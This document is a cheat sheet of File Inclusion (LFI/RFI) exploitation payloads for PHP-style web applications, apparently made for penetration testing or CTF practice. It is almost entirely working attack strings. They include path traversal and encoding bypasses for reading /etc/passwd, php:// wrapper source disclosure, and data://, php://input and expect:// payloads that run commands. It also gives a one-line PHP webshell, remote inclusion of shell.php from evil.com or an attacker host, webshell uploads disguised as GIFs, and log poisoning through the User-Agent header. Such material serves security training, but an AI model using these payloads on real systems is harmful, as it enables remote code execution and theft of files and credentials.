# File Inclusion (LFI / RFI) Exploitation

---

> 📖 Intro

```c
File Inclusion vulnerabilities occur when user-controlled input is passed to file-handling functions (e.g., PHP include, NodeJS fs.readFile, Java import, .NET @Html.Partial).  
They allow attackers to read files, leak source code, or even achieve RCE  
We distinguish between:
- LFI (Local File Inclusion) → Reading local files
- RFI (Remote File Inclusion) → Including remote files/scripts
```


---

## 🗂️ Local File Inclusion (LFI)

>  Basic Payloads

```bash
# Linux passwd file
?page=/etc/passwd                                  (/etc/passwd)

# Windows boot.ini
?page=C:\Windows\boot.ini                          (Windows boot.ini)

# Path traversal
?page=../../../../etc/passwd                       (read passwd with traversal)
?page=....//....//....//etc/passwd                 (recursive bypass)

# Double encoding
?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd               (../etc/passwd)
?page=..%252f..%252f..%252fetc%252fpasswd          (double encoded)
```

> Prefix / Extension Bypasses

```c
# Extension appended (e.g. .php auto added)
?page=/etc/passwd%00                              (null byte, old PHP)
?page=/etc/passwd/.                               (path truncation trick)
?page=/etc/passwd%23                              (# comment bypass in some cases)
```

> PHP Filters (Source Disclosure)
```c
# Base64 encode PHP source
?page=php://filter/read=convert.base64-encode/resource=index
(returns base64 of index.php)

# Decode on attacker side
echo 'BASE64_STRING' | base64 -d
```

> Wrappers for Code Execution

```c
# 🧪 data:// wrapper (requires allow_url_include=On)
# Base64-encoded payload: <?php system($_GET["cmd"]); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id

# 📥 php://input wrapper (works with POST body injection)
curl -X POST --data '<?php system($_GET["cmd"]); ?>' \
"http://target/index.php?page=php://input&cmd=id"

# 📦 php://filter wrapper (for RCE chain or source leak)
?page=php://filter/convert.base64-encode/resource=index.php

# 📞 expect:// wrapper (must be enabled in php.ini)
?page=expect://id

# 🔄 file:// wrapper (default and often implicit)
?page=file:///var/log/apache2/access.log

# 🌐 http:// and https:// wrapper (with allow_url_include=On)
?page=http://evil.com/shell.txt
?page=https://evil.com/shell.txt

# 🧪 compress.zlib wrapper (read gzipped file contents)
?page=compress.zlib://index.php.gz

# 🧪 compress.bzip2 wrapper (read bzip2-compressed files)
?page=compress.bzip2://index.php.bz2

# 🔀 php://memory wrapper (rare, but usable for stream control)
?page=php://memory

# 🔀 php://temp wrapper (similar to php://memory)
?page=php://temp

# 📄 phar:// wrapper (can trigger deserialization if vulnerable)
?page=phar://path/to/phar_file

```

## Remote File Inclusion - RFI

> HTTP Hosting

```c
# Attacker hosts shell.php
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 8000

# Victim includes it
?page=http://<ATTACKER_IP>:8000/shell.php&cmd=id
```

> FTP Hosting

```c
python -m pyftpdlib -p 21
?page=ftp://<IP>/shell.php&cmd=id
```

> SMB Hosting (Windows targets)

```c
impacket-smbserver share $(pwd)
?page=\\<IP>\share\shell.php&cmd=id
```

---
## 🖼️ File Upload + LFI → RCE


> 🖼️ File Upload + LFI → RCE

```c
# Malicious GIF upload
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
Upload → /profile_images/shell.gif

# Include via LFI
?page=./profile_images/shell.gif&cmd=id
``` 

> 📜 Log Poisoning

```c
# Poison User-Agent
curl -s http://target/ -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Include Apache access.log (LFI + RCE)
?page=/var/log/apache2/access.log&cmd=id

# 🧾 Common Log File Paths

# Apache logs
?page=/var/log/apache2/access.log
?page=/var/log/apache2/error.log
?page=/var/log/httpd/access_log
?page=/var/log/httpd/error_log

# Nginx logs
?page=/var/log/nginx/access.log
?page=/var/log/nginx/error.log

# PHP error logs
?page=/var/log/php_errors.log

# System logs
?page=/var/log/syslog
?page=/var/log/messages
?page=/var/log/debug

# Auth / Security logs
?page=/var/log/auth.log        # Debian/Ubuntu
?page=/var/log/secure          # RHEL/CentOS

# SSH logs
?page=/var/log/secure
?page=/var/log/auth.log

# FTP logs
?page=/var/log/vsftpd.log
?page=/var/log/xferlog
?page=/var/log/proftpd/proftpd.log

# Mail logs
?page=/var/log/mail.log
?page=/var/log/maillog
?page=/var/log/exim4/mainlog

# Cron logs
?page=/var/log/cron
?page=/var/log/cron.log

# Boot logs
?page=/var/log/boot.log
?page=/var/log/dmesg

# Database logs
?page=/var/log/mysql/error.log
?page=/var/log/mysql/mysql.log
?page=/var/log/postgresql/postgresql.log

# Web application logs
?page=/var/log/tomcat/catalina.out
?page=/opt/tomcat/logs/catalina.out
?page=/var/log/jenkins/jenkins.log
```

> 🔎 Automated Fuzzing

```c
# Discover params
ffuf -w wordlist.txt:FUZZ -u http://target/index.php?FUZZ=value

# LFI wordlist
ffuf -w LFI-Jhaddix.txt:FUZZ -u http://target/index.php?page=FUZZ
```





